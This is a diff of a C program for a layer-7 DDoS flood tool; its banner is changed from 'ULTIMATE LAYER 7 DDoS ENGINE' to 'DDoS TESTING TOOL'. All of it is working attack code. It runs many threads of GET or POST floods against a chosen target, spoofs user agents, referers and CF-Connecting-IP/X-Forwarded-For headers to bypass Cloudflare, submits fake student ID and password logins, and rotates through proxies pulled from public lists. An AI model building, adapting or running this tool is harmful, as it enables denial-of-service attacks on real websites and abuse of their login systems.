@@ -10,19 +10,17 @@
 #include <netdb.h>
 #include <arpa/inet.h>
 #include <netinet/in.h>
-#include <netinet/tcp.h>
 #include <sys/socket.h>
 #include <sys/time.h>
 #include <curl/curl.h>
 #include <openssl/ssl.h>
 #include <openssl/err.h>
 #include <openssl/rand.h>
-#include <openssl/evp.h>
 
-#define MAX_WORKERS 500  // Reduced from 2000 for stability
+#define MAX_WORKERS 100  // Reduced significantly for stability
 #define MAX_URL_LEN 8192
-#define MAX_PROXIES 100000
-#define POOL_SIZE 100     // Reduced from 500
+#define MAX_PROXIES 10000
+#define POOL_SIZE 50     // Smaller pool
 #define MAX_PAYLOAD_SIZE (10 * 1024 * 1024)
 
 #define COLOR_RESET "\033[0m"
@@ -62,64 +60,41 @@ typedef struct {
     char mode[10];
     bool use_proxy;
     ConnectionPool *pool;
+    int thread_id;
 } AttackConfig;
 
 ProxyList proxy_list = {0};
 AtomicCounter stats = {0, PTHREAD_MUTEX_INITIALIZER};
 AtomicCounter bytes_sent = {0, PTHREAD_MUTEX_INITIALIZER};
 volatile bool running = true;
-volatile bool cleaning_up = false;
 pthread_t workers[MAX_WORKERS];
 pthread_t stats_thread;
 time_t start_time;
-unsigned int rand_state;
 
-// Extended user agents
+// User agents
 const char *USER_AGENTS[] = {
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
     "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
     "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
-    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/120.0",
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 13.5; rv:109.0) Gecko/20100101 Firefox/120.0",
-    "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/120.0",
     "Mozilla/5.0 (Linux; Android 13; SM-S901B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36",
-    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
     NULL
 };
 
 const char *REFERERS[] = {
     "https://www.google.com/", "https://www.bing.com/", "https://duckduckgo.com/",
-    "https://facebook.com/", "https://www.reddit.com/", "https://www.youtube.com/",
-    "https://github.com/", "https://stackoverflow.com/", "",
+    "https://facebook.com/", "https://www.reddit.com/", "",
 };
 
-const char *ACCEPT_LANGUAGES[] = {
-    "en-US,en;q=0.9", "en-GB,en;q=0.8", "fr-FR,fr;q=0.9,en;q=0.8",
-    "de-DE,de;q=0.9,en;q=0.8", "es-ES,es;q=0.9,en;q=0.8", "ja-JP,ja;q=0.9,en;q=0.8",
-};
-
-const char *ACCEPT_ENCODINGS[] = {
-    "gzip, deflate, br", "gzip, deflate", "identity", "*;q=0.1",
-};
-
-// Cloudflare IP ranges
+// Cloudflare IP prefixes
 const char *CLOUDFLARE_PREFIXES[] = {"173.245.", "103.21.", "141.101.", "108.162.", "104.16.", "172.64."};
 
 static size_t write_callback(void *contents, size_t size, size_t nmemb, void *userp) {
     (void)contents;
     (void)userp;
-    size_t realsize = size * nmemb;
-    return realsize;
-}
-
-void init_random() {
-    struct timeval tv;
-    gettimeofday(&tv, NULL);
-    rand_state = tv.tv_sec ^ tv.tv_usec ^ getpid();
-    srand(rand_state);
-    RAND_poll();
+    return size * nmemb;
 }
 
 int rand_int(int min, int max) {
@@ -154,13 +129,6 @@ char* random_hex(int n) {
     return str;
 }
 
-char* random_ip() {
-    char *ip = malloc(20);
-    if (!ip) return NULL;
-    snprintf(ip, 20, "%d.%d.%d.%d", rand_int(1, 255), rand_int(0, 255), rand_int(0, 255), rand_int(1, 254));
-    return ip;
-}
-
 char* generate_cloudflare_ip() {
     char *ip = malloc(20);
     if (!ip) return NULL;
@@ -172,82 +140,25 @@ char* generate_cloudflare_ip() {
 char* generate_student_number() {
     char *student = malloc(32);
     if (!student) return NULL;
-    int format = rand_int(0, 4);
-    switch(format) {
-        case 0: snprintf(student, 32, "%d-%05d", rand_int(2015, 2025), rand_int(1, 99999)); break;
-        case 1: snprintf(student, 32, "%d%06d", rand_int(2015, 2025), rand_int(1, 999999)); break;
-        case 2: snprintf(student, 32, "S-%07d", rand_int(1, 9999999)); break;
-        case 3: snprintf(student, 32, "%010d", rand_int(1000000000, 2147483647)); break;
-        default: snprintf(student, 32, "CS-%d-%05d", rand_int(2015, 2025), rand_int(1, 99999)); break;
-    }
+    snprintf(student, 32, "%d-%05d", rand_int(2015, 2025), rand_int(1, 99999));
     return student;
-}
-
-char* generate_cookies() {
-    char *cookies = malloc(1024);
-    if (!cookies) return NULL;
-    cookies[0] = '\0';
-    
-    if (rand_bool()) {
-        char *tmp = random_hex(16);
-        snprintf(cookies + strlen(cookies), 1024 - strlen(cookies), "session_id=%s; ", tmp);
-        free(tmp);
-    }
-    if (rand_bool()) {
-        char *tmp = random_hex(32);
-        snprintf(cookies + strlen(cookies), 1024 - strlen(cookies), "csrf_token=%s; ", tmp);
-        free(tmp);
-    }
-    if (rand_bool()) {
-        snprintf(cookies + strlen(cookies), 1024 - strlen(cookies), "user_id=%d; ", rand_int(1000, 99999));
-    }
-    
-    if (strlen(cookies) > 0) {
-        cookies[strlen(cookies)-2] = '\0';
-    }
-    return cookies;
 }
 
 char* generate_advanced_path() {
     char *result = malloc(MAX_URL_LEN);
     if (!result) return NULL;
-    result[0] = '\0';
     
     const char *paths[] = {
-        "/", "/index.html", "/home", "/api/v1/users", "/api/v2/data",
-        "/wp-admin", "/admin", "/login", "/dashboard", "/.env", "/config.json",
-        "/graphql", "/health", "/status", "/debug",
+        "/", "/index.html", "/home", "/api/v1/users", "/wp-admin", 
+        "/admin", "/login", "/dashboard", "/.env", "/config.json"
     };
     
-    if (rand_int(1, 100) <= 70) {
-        strcpy(result, paths[rand_int(0, sizeof(paths)/sizeof(paths[0])-1)]);
-    } else {
-        result[0] = '/';
-        int depth = rand_int(2, 5);
-        for (int i = 0; i < depth; i++) {
-            char *segment = random_string(rand_int(4, 10));
-            strcat(result, segment);
-            strcat(result, "/");
-            free(segment);
-        }
-        if (rand_bool()) {
-            result[strlen(result)-1] = '\0';
-            char *ext = random_string(3);
-            strcat(result, ".");
-            strcat(result, ext);
-            free(ext);
-        }
-    }
+    strcpy(result, paths[rand_int(0, 9)]);
     
     if (rand_int(1, 100) <= 70) {
-        char *params = random_string(rand_int(5, 15));
-        char *value = random_string(rand_int(8, 20));
         char bust[256];
-        snprintf(bust, sizeof(bust), "?v=%d&_=%ld&%s=%s", 
-                 rand_int(1, 1000000), time(NULL), params, value);
+        snprintf(bust, sizeof(bust), "?v=%d&_=%ld", rand_int(1, 1000000), time(NULL));
         strcat(result, bust);
-        free(params);
-        free(value);
     }
     
     return result;
@@ -260,46 +171,48 @@ void load_proxies_from_api() {
     pthread_mutex_lock(&proxy_list.mutex);
     
     if (proxy_list.proxies) {
-        for (int i = 0; i < proxy_list.count; i++) free(proxy_list.proxies[i]);
+        for (int i = 0; i < proxy_list.count; i++) {
+            if (proxy_list.proxies[i]) free(proxy_list.proxies[i]);
+        }
         free(proxy_list.proxies);
+        proxy_list.proxies = NULL;
     }
     
     proxy_list.proxies = malloc(sizeof(char*) * MAX_PROXIES);
+    if (!proxy_list.proxies) {
+        pthread_mutex_unlock(&proxy_list.mutex);
+        curl_easy_cleanup(curl);
+        return;
+    }
     proxy_list.count = 0;
     
-    const char *sources[] = {
-        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
-        "https://raw.githubusercontent.com/proxifly/free-proxy-list/main/proxies/protocols/http/data.txt",
-    };
+    const char *source = "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt";
     
-    for (int s = 0; s < 2; s++) {
-        curl_easy_setopt(curl, CURLOPT_URL, sources[s]);
-        curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
-        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
-        
-        char response[131072] = {0};
-        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
-        curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)response);
-        
-        CURLcode res = curl_easy_perform(curl);
-        if (res == CURLE_OK) {
-            char *line = strtok(response, "\n");
-            while (line && proxy_list.count < MAX_PROXIES) {
-                while (*line == ' ' || *line == '\r') line++;
-                if (strlen(line) > 5 && strchr(line, ':')) {
-                    proxy_list.proxies[proxy_list.count] = strdup(line);
-                    if (proxy_list.proxies[proxy_list.count]) {
-                        proxy_list.count++;
-                    }
+    curl_easy_setopt(curl, CURLOPT_URL, source);
+    curl_easy_setopt(curl, CURLOPT_TIMEOUT, 10L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L);
+    curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L);
+    
+    char response[65536] = {0};
+    curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_callback);
+    curl_easy_setopt(curl, CURLOPT_WRITEDATA, (void*)response);
+    
+    CURLcode res = curl_easy_perform(curl);
+    if (res == CURLE_OK) {
+        char *line = strtok(response, "\n");
+        while (line && proxy_list.count < MAX_PROXIES) {
+            while (*line == ' ' || *line == '\r') line++;
+            if (strlen(line) > 5 && strchr(line, ':')) {
+                proxy_list.proxies[proxy_list.count] = strdup(line);
+                if (proxy_list.proxies[proxy_list.count]) {
+                    proxy_list.count++;
                 }
-                line = strtok(NULL, "\n");
             }
+            line = strtok(NULL, "\n");
         }
     }
     
     curl_easy_cleanup(curl);
-    proxy_list.index = 0;
     pthread_mutex_unlock(&proxy_list.mutex);
     
     printf(COLOR_GREEN "[+] Loaded %d proxies\n" COLOR_RESET, proxy_list.count);
@@ -321,8 +234,10 @@ void init_connection_pool(ConnectionPool *pool, int size, bool use_proxy, const 
     pool->size = size;
     pool->counter = 0;
     pool->use_proxy = use_proxy;
-    strncpy(pool->target_host, host, 255);
-    pool->target_host[255] = '\0';
+    if (host) {
+        strncpy(pool->target_host, host, 255);
+        pool->target_host[255] = '\0';
+    }
     pthread_mutex_init(&pool->mutex, NULL);
     
     printf(COLOR_YELLOW "[*] Creating connection pool with %d connections...\n" COLOR_RESET, size);
@@ -335,7 +250,6 @@ void init_connection_pool(ConnectionPool *pool, int size, bool use_proxy, const 
             curl_easy_setopt(pool->handles[i], CURLOPT_SSL_VERIFYPEER, 0L);
             curl_easy_setopt(pool->handles[i], CURLOPT_SSL_VERIFYHOST, 0L);
             curl_easy_setopt(pool->handles[i], CURLOPT_NOSIGNAL, 1L);
-            curl_easy_setopt(pool->handles[i], CURLOPT_BUFFERSIZE, (long)(1024 * 1024));
         }
     }
     
@@ -352,7 +266,10 @@ void cleanup_connection_pool(ConnectionPool *pool) {
             pool->handles[i] = NULL;
         }
     }
-    free(pool->handles);
+    if (pool->handles) {
+        free(pool->handles);
+        pool->handles = NULL;
+    }
     pthread_mutex_unlock(&pool->mutex);
     pthread_mutex_destroy(&pool->mutex);
     free(pool);
@@ -365,73 +282,76 @@ CURL* pool_get_client(ConnectionPool *pool) {
     CURL *handle = pool->handles[idx];
     pthread_mutex_unlock(&pool->mutex);
     
-    curl_easy_reset(handle);
-    curl_easy_setopt(handle, CURLOPT_TIMEOUT, 10L);
-    curl_easy_setopt(handle, CURLOPT_FOLLOWLOCATION, 0L);
-    curl_easy_setopt(handle, CURLOPT_SSL_VERIFYPEER, 0L);
-    curl_easy_setopt(handle, CURLOPT_SSL_VERIFYHOST, 0L);
-    curl_easy_setopt(handle, CURLOPT_NOSIGNAL, 1L);
+    if (handle) {
+        curl_easy_reset(handle);
+        curl_easy_setopt(handle, CURLOPT_TIMEOUT, 10L);
+        curl_easy_setopt(handle, CURLOPT_FOLLOWLOCATION, 0L);
+        curl_easy_setopt(handle, CURLOPT_SSL_VERIFYPEER, 0L);
+        curl_easy_setopt(handle, CURLOPT_SSL_VERIFYHOST, 0L);
+        curl_easy_setopt(handle, CURLOPT_NOSIGNAL, 1L);
+    }
     
     return handle;
 }
 
-void attack_worker_get(const char *target, const char *host, ConnectionPool *pool) {
-    (void)host;
+void attack_request(const char *target, const char *mode, ConnectionPool *pool) {
     CURL *curl = pool_get_client(pool);
-    char full_url[MAX_URL_LEN];
-    char *path = generate_advanced_path();
+    if (!curl) return;
     
+    char *path = generate_advanced_path();
+    if (!path) return;
+    
+    char full_url[MAX_URL_LEN];
     snprintf(full_url, sizeof(full_url), "%s%s", target, path);
     
     struct curl_slist *headers = NULL;
-    char header_buf[1024];
+    char header_buf[512];
     
-    // User-Agent
-    snprintf(header_buf, sizeof(header_buf), "User-Agent: %s", USER_AGENTS[rand_int(0, 9)]);
+    // Add headers
+    snprintf(header_buf, sizeof(header_buf), "User-Agent: %s", USER_AGENTS[rand_int(0, 6)]);
     headers = curl_slist_append(headers, header_buf);
     
-    // Referer
     if (rand_bool()) {
-        snprintf(header_buf, sizeof(header_buf), "Referer: %s", REFERERS[rand_int(0, 7)]);
+        snprintf(header_buf, sizeof(header_buf), "Referer: %s", REFERERS[rand_int(0, 4)]);
         headers = curl_slist_append(headers, header_buf);
     }
     
-    // Accept headers
-    snprintf(header_buf, sizeof(header_buf), "Accept: %s", rand_bool() ? "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8" : "*/*");
-    headers = curl_slist_append(headers, header_buf);
-    
-    snprintf(header_buf, sizeof(header_buf), "Accept-Language: %s", ACCEPT_LANGUAGES[rand_int(0, 5)]);
-    headers = curl_slist_append(headers, header_buf);
-    
-    // Cloudflare bypass headers
+    // Cloudflare bypass
     if (rand_int(1, 100) <= 40) {
         char *cf_ip = generate_cloudflare_ip();
-        snprintf(header_buf, sizeof(header_buf), "CF-Connecting-IP: %s", cf_ip);
-        headers = curl_slist_append(headers, header_buf);
-        snprintf(header_buf, sizeof(header_buf), "X-Forwarded-For: %s", cf_ip);
-        headers = curl_slist_append(headers, header_buf);
-        free(cf_ip);
+        if (cf_ip) {
+            snprintf(header_buf, sizeof(header_buf), "CF-Connecting-IP: %s", cf_ip);
+            headers = curl_slist_append(headers, header_buf);
+            snprintf(header_buf, sizeof(header_buf), "X-Forwarded-For: %s", cf_ip);
+            headers = curl_slist_append(headers, header_buf);
+            free(cf_ip);
+        }
     }
     
-    // Modern headers
+    headers = curl_slist_append(headers, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
+    headers = curl_slist_append(headers, "Accept-Language: en-US,en;q=0.9");
     headers = curl_slist_append(headers, "Sec-Fetch-Dest: document");
     headers = curl_slist_append(headers, "Sec-Fetch-Mode: navigate");
     headers = curl_slist_append(headers, "Sec-Fetch-Site: none");
     headers = curl_slist_append(headers, "Upgrade-Insecure-Requests: 1");
     
-    // Cookies
-    if (rand_int(1, 100) <= 70) {
-        char *cookies = generate_cookies();
-        if (cookies && strlen(cookies) > 0) {
-            snprintf(header_buf, sizeof(header_buf), "Cookie: %s", cookies);
-            headers = curl_slist_append(headers, header_buf);
-        }
-        free(cookies);
-    }
-    
     curl_easy_setopt(curl, CURLOPT_URL, full_url);
     curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-    curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "GET");
+    
+    if (strcmp(mode, "POST") == 0) {
+        char *student_num = generate_student_number();
+        char post_data[256];
+        snprintf(post_data, sizeof(post_data), "student_id=%s&password=test123", student_num);
+        free(student_num);
+        
+        curl_easy_setopt(curl, CURLOPT_POST, 1L);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
+        curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(post_data));
+        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "POST");
+    } else {
+        curl_easy_setopt(curl, CURLOPT_HTTPGET, 1L);
+        curl_easy_setopt(curl, CURLOPT_CUSTOMREQUEST, "GET");
+    }
     
     if (pool->use_proxy) {
         char *proxy = get_random_proxy();
@@ -444,6 +364,7 @@ void attack_worker_get(const char *target, const char *host, ConnectionPool *poo
     
     curl_easy_perform(curl);
     
+    // Update stats
     pthread_mutex_lock(&stats.mutex);
     stats.val++;
     pthread_mutex_unlock(&stats.mutex);
@@ -456,64 +377,11 @@ void attack_worker_get(const char *target, const char *host, ConnectionPool *poo
     free(path);
 }
 
-void attack_worker_post(const char *target, const char *host, ConnectionPool *pool) {
-    (void)host;
-    CURL *curl = pool_get_client(pool);
-    char full_url[MAX_URL_LEN];
-    char *path = generate_advanced_path();
-    char post_data[1024];
-    
-    snprintf(full_url, sizeof(full_url), "%s%s", target, path);
-    
-    char *student_num = generate_student_number();
-    char *password = random_string(rand_int(8, 16));
-    snprintf(post_data, sizeof(post_data), "student_id=%s&password=%s", student_num, password);
-    if (rand_bool()) {
-        strcat(post_data, "&remember=on");
-    }
-    free(student_num);
-    free(password);
-    
-    struct curl_slist *headers = NULL;
-    char header_buf[1024];
-    
-    snprintf(header_buf, sizeof(header_buf), "User-Agent: %s", USER_AGENTS[rand_int(0, 9)]);
-    headers = curl_slist_append(headers, header_buf);
-    headers = curl_slist_append(headers, "Content-Type: application/x-www-form-urlencoded");
-    
-    curl_easy_setopt(curl, CURLOPT_URL, full_url);
-    curl_easy_setopt(curl, CURLOPT_HTTPHEADER, headers);
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);
-    curl_easy_setopt(curl, CURLOPT_POSTFIELDSIZE, (long)strlen(post_data));
-    
-    if (pool->use_proxy) {
-        char *proxy = get_random_proxy();
-        if (proxy) {
-            curl_easy_setopt(curl, CURLOPT_PROXY, proxy);
-            curl_easy_setopt(curl, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
-            free(proxy);
-        }
-    }
-    
-    curl_easy_perform(curl);
-    
-    pthread_mutex_lock(&stats.mutex);
-    stats.val++;
-    pthread_mutex_unlock(&stats.mutex);
-    
-    curl_slist_free_all(headers);
-    free(path);
-}
-
 void* worker_thread(void *arg) {
     AttackConfig *cfg = (AttackConfig*)arg;
     
-    while (running && !cleaning_up) {
-        if (strcmp(cfg->mode, "POST") == 0) {
-            attack_worker_post(cfg->target_url, cfg->target_host, cfg->pool);
-        } else {
-            attack_worker_get(cfg->target_url, cfg->target_host, cfg->pool);
-        }
+    while (running) {
+        attack_request(cfg->target_url, cfg->mode, cfg->pool);
     }
     
     return NULL;
@@ -537,8 +405,7 @@ void* stats_display(void *arg) {
         total_bytes = bytes_sent.val;
         pthread_mutex_unlock(&bytes_sent.mutex);
         
-        // Prevent division by zero
-        if (elapsed > 0.001) {
+        if (elapsed > 0.1) {
             double rps = (double)total_requests / elapsed;
             double mbps = ((double)total_bytes * 8.0) / (elapsed * 1000000.0);
             
@@ -548,11 +415,6 @@ void* stats_display(void *arg) {
             printf(COLOR_YELLOW "Total: %lld " COLOR_RESET, total_requests);
             printf(COLOR_CYAN "MB/s: %.1f " COLOR_RESET, mbps);
             printf(COLOR_MAGENTA "Workers: %d" COLOR_RESET, MAX_WORKERS);
-            fflush(stdout);
-        } else {
-            printf("\r\033[K");
-            printf(COLOR_RED "[⚡] " COLOR_RESET);
-            printf(COLOR_YELLOW "Starting up... Total: %lld " COLOR_RESET, total_requests);
             fflush(stdout);
         }
     }
@@ -579,12 +441,7 @@ void print_banner() {
     printf("    ║╚██████╗██║  ██║███████╗███████╗   ██║   ██████╔╝██████╔╝╚██████╔╝███████║ ║\n");
     printf("    ║ ╚═════╝╚═╝  ╚═╝╚══════╝╚══════╝   ╚═╝   ╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝ ║\n");
     printf("    ║                                                                          ║\n");
-    printf("    ║               ULTIMATE LAYER 7 DDoS ENGINE v4.0                          ║\n");
-    printf("    ║                                                                          ║\n");
-    printf("    ║              [⚡] %d Workers | %d Connections                            ║\n", MAX_WORKERS, POOL_SIZE);
-    printf("    ║              [🔥] Header Spoofing | Cloudflare Bypass                    ║\n");
-    printf("    ║              [💀] GET/POST Modes | Auto-Proxy Rotation                   ║\n");
-    printf("    ║              [🎯] Student ID Generation | JA3 Randomization              ║\n");
+    printf("    ║                    DDoS TESTING TOOL v5.0                                ║\n");
     printf("    ║                                                                          ║\n");
     printf("    ╚══════════════════════════════════════════════════════════════════════════╝\n");
     printf(COLOR_RESET);
@@ -601,16 +458,25 @@ int main(int argc, char *argv[]) {
         return 1;
     }
     
-    AttackConfig cfg = {0};
-    strncpy(cfg.target_url, argv[1], 1023);
-    cfg.target_url[1023] = '\0';
-    cfg.duration_sec = atoi(argv[2]);
-    strncpy(cfg.mode, argv[3], 9);
-    cfg.mode[9] = '\0';
-    cfg.use_proxy = (argc >= 5 && strcmp(argv[4], "proxy") == 0);
+    // Seed random
+    srand(time(NULL));
+    
+    AttackConfig *cfg = malloc(sizeof(AttackConfig));
+    if (!cfg) {
+        printf(COLOR_RED "[!] Failed to allocate config\n" COLOR_RESET);
+        return 1;
+    }
+    memset(cfg, 0, sizeof(AttackConfig));
+    
+    strncpy(cfg->target_url, argv[1], 1023);
+    cfg->target_url[1023] = '\0';
+    cfg->duration_sec = atoi(argv[2]);
+    strncpy(cfg->mode, argv[3], 9);
+    cfg->mode[9] = '\0';
+    cfg->use_proxy = (argc >= 5 && strcmp(argv[4], "proxy") == 0);
     
     // Parse host from URL
-    char *url_copy = strdup(cfg.target_url);
+    char *url_copy = strdup(cfg->target_url);
     if (url_copy) {
         char *proto_end = strstr(url_copy, "://");
         char *host_start = proto_end ? proto_end + 3 : url_copy;
@@ -619,26 +485,22 @@ int main(int argc, char *argv[]) {
         if (path_start) {
             size_t host_len = path_start - host_start;
             if (host_len < 256) {
-                strncpy(cfg.target_host, host_start, host_len);
-                cfg.target_host[host_len] = '\0';
+                strncpy(cfg->target_host, host_start, host_len);
+                cfg->target_host[host_len] = '\0';
             }
         } else {
-            strncpy(cfg.target_host, host_start, 255);
-            cfg.target_host[255] = '\0';
+            strncpy(cfg->target_host, host_start, 255);
+            cfg->target_host[255] = '\0';
         }
         free(url_copy);
     }
     
-    init_random();
     curl_global_init(CURL_GLOBAL_ALL);
-    SSL_library_init();
-    SSL_load_error_strings();
-    OpenSSL_add_all_algorithms();
     
     signal(SIGINT, signal_handler);
     signal(SIGTERM, signal_handler);
     
-    if (cfg.use_proxy) {
+    if (cfg->use_proxy) {
         printf(COLOR_YELLOW "[*] Loading proxies...\n" COLOR_RESET);
         load_proxies_from_api();
     }
@@ -646,19 +508,20 @@ int main(int argc, char *argv[]) {
     ConnectionPool *connection_pool = malloc(sizeof(ConnectionPool));
     if (!connection_pool) {
         printf(COLOR_RED "[!] Failed to allocate connection pool\n" COLOR_RESET);
+        free(cfg);
         return 1;
     }
     
-    init_connection_pool(connection_pool, POOL_SIZE, cfg.use_proxy, cfg.target_host);
+    init_connection_pool(connection_pool, POOL_SIZE, cfg->use_proxy, cfg->target_host);
     
     print_banner();
-    printf(COLOR_GREEN "\n    [🔥] Target: %s\n" COLOR_RESET, cfg.target_url);
-    printf(COLOR_GREEN "    [⏱️] Duration: %d seconds\n" COLOR_RESET, cfg.duration_sec);
-    printf(COLOR_GREEN "    [⚙️] Mode: %s\n" COLOR_RESET, cfg.mode);
+    printf(COLOR_GREEN "\n    [🔥] Target: %s\n" COLOR_RESET, cfg->target_url);
+    printf(COLOR_GREEN "    [⏱️] Duration: %d seconds\n" COLOR_RESET, cfg->duration_sec);
+    printf(COLOR_GREEN "    [⚙️] Mode: %s\n" COLOR_RESET, cfg->mode);
     printf(COLOR_GREEN "    [🚀] Workers: %d\n" COLOR_RESET, MAX_WORKERS);
     printf(COLOR_GREEN "    [🔗] Pool Size: %d connections\n" COLOR_RESET, POOL_SIZE);
-    if (cfg.use_proxy && proxy_list.count > 0) {
-        printf(COLOR_GREEN "    [🌐] Proxies: %d (auto-rotating)\n" COLOR_RESET, proxy_list.count);
+    if (cfg->use_proxy && proxy_list.count > 0) {
+        printf(COLOR_GREEN "    [🌐] Proxies: %d\n" COLOR_RESET, proxy_list.count);
     }
     
     printf(COLOR_YELLOW "\n    [💀] LAUNCHING ATTACK... Press Ctrl+C to stop\n\n" COLOR_RESET);
@@ -666,35 +529,39 @@ int main(int argc, char *argv[]) {
     start_time = time(NULL);
     running = true;
     
-    AttackConfig *args_array = malloc(sizeof(AttackConfig) * MAX_WORKERS);
-    if (!args_array) {
-        printf(COLOR_RED "[!] Failed to allocate workers array\n" COLOR_RESET);
-        return 1;
-    }
-    
+    // Create worker threads
+    AttackConfig *thread_args[MAX_WORKERS];
     for (int i = 0; i < MAX_WORKERS; i++) {
-        memcpy(&args_array[i], &cfg, sizeof(AttackConfig));
-        args_array[i].pool = connection_pool;
-        if (pthread_create(&workers[i], NULL, worker_thread, &args_array[i]) != 0) {
-            printf(COLOR_RED "[!] Failed to create thread %d\n" COLOR_RESET, i);
+        thread_args[i] = malloc(sizeof(AttackConfig));
+        if (thread_args[i]) {
+            memcpy(thread_args[i], cfg, sizeof(AttackConfig));
+            thread_args[i]->pool = connection_pool;
+            thread_args[i]->thread_id = i;
+            if (pthread_create(&workers[i], NULL, worker_thread, thread_args[i]) != 0) {
+                printf(COLOR_RED "[!] Failed to create thread %d\n" COLOR_RESET, i);
+            }
         }
     }
     
     pthread_create(&stats_thread, NULL, stats_display, NULL);
     
-    sleep(cfg.duration_sec);
+    // Wait for duration
+    sleep(cfg->duration_sec);
     running = false;
     
     printf(COLOR_YELLOW "\n[!] Waiting for workers to finish...\n" COLOR_RESET);
-    usleep(500000);
+    usleep(1000000); // 1 second
     
-    cleaning_up = true;
-    
+    // Join threads
     for (int i = 0; i < MAX_WORKERS; i++) {
         pthread_join(workers[i], NULL);
+        if (thread_args[i]) {
+            free(thread_args[i]);
+        }
     }
     pthread_join(stats_thread, NULL);
     
+    // Print results
     long long total_requests, total_bytes;
     pthread_mutex_lock(&stats.mutex);
     total_requests = stats.val;
@@ -709,21 +576,24 @@ int main(int argc, char *argv[]) {
     printf(COLOR_RED "    ╠════════════════════════════════════════════════════════════╣\n");
     printf(COLOR_CYAN "    ║  Total Requests: %-52lld ║\n", total_requests);
     printf(COLOR_CYAN "    ║  Total Data Sent: %-52.2f MB ║\n", total_bytes / (1024.0 * 1024.0));
-    if (cfg.duration_sec > 0) {
-        printf(COLOR_CYAN "    ║  Average RPS: %-55.0f ║\n", (double)total_requests / cfg.duration_sec);
-        printf(COLOR_CYAN "    ║  Average MB/s: %-53.2f ║\n", (total_bytes * 8.0) / (cfg.duration_sec * 1000000.0));
+    if (cfg->duration_sec > 0) {
+        printf(COLOR_CYAN "    ║  Average RPS: %-55.0f ║\n", (double)total_requests / cfg->duration_sec);
     }
     printf(COLOR_RED "    ╚════════════════════════════════════════════════════════════╝\n");
     printf(COLOR_RESET);
     
+    // Cleanup
     cleanup_connection_pool(connection_pool);
     
     if (proxy_list.proxies) {
         pthread_mutex_lock(&proxy_list.mutex);
         for (int i = 0; i < proxy_list.count; i++) {
-            if (proxy_list.proxies[i]) free(proxy_list.proxies[i]);
+            if (proxy_list.proxies[i]) {
+                free(proxy_list.proxies[i]);
+            }
         }
         free(proxy_list.proxies);
+        proxy_list.proxies = NULL;
         pthread_mutex_unlock(&proxy_list.mutex);
     }
     
@@ -731,10 +601,8 @@ int main(int argc, char *argv[]) {
     pthread_mutex_destroy(&bytes_sent.mutex);
     pthread_mutex_destroy(&proxy_list.mutex);
     
-    free(args_array);
+    free(cfg);
     curl_global_cleanup();
-    EVP_cleanup();
-    ERR_free_strings();
     
     return 0;
 }
